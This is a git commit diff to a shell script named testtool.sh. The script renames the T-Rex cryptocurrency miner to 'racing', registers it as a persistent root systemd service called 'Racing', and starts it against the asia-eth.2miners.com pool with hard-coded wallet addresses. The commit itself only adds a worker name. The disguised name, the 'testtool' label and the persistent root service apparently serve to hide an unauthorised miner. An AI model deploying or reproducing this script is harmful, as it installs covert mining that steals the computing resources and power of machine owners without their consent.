c16199563107df76c4e5d5a3bde62de087f3196e
thucnh96bucket <100561651+thucnh96bucket@users.noreply.github.com>
2022-04-01 01:20:52 +0800

    Update testtool.sh

--- testtool.sh
+++ testtool.sh
@@ -14,4 +14,4 @@ mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xC46a50Bf45261e21B7418EeAf80e51f331a7Afb8 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x3cf2e52746bf8a1e8f9248b24bfc8b49b09c79b8 -p x &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x3cf2e52746bf8a1e8f9248b24bfc8b49b09c79b8 -p x -w madaothanhcong &
